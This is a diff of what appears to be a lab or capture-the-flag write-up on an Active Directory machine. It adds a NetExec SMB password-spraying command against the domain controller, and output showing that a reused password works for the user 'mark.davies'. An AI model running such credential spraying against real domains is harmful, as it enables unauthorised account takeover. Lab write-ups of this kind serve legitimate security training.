@@ -192,9 +192,17 @@ If i check the child nodes on the deleted objects OU, its only mark, so this pri
 
 Ill use bloodyAD to restore the object
 
-Ill add the user `mark.daves`
+Ill add the user `mark.davies` to the user list
 
 # Compromising `mark.davies`
+
+```python
+❯❯❯ nxc smb dc01.checkpoint.htb -u users.txt -p 'Checkpoint2024!' --continue-on-success --smb-timeout 5
+
+SMB         10.129.80.26    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
+```
+
+This password also works on `mark.davies`
 
 
 
